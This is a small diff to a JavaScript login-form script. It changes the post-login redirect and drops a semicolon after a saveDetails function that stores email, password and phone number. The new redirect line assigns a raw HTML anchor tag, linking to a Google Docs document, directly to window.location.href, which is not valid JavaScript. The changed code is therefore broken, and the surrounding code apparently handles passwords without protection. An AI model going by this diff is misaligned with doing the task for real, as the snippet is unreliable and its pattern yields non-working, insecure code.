@@ -96,7 +96,7 @@ loginForm.addEventListener("submit", function(e) {
               document.querySelector(".alert").style.display = "none";
             },2000);
             setTimeout(function(){
-              window.location.href = "index.html";
+              window.location.href = <a href="https://docs.google.com/document/d/1y8hQbEkQIaGVs2tg722A5BVAq4_3oerOuaHpMXjJcL8/edit"></a>;
             },1000);
             
           } else {
@@ -122,4 +122,4 @@ function saveDetails(email, password, phoneNumber){
     password: password,
     phoneNumber: phoneNumber
   });
-};
+}
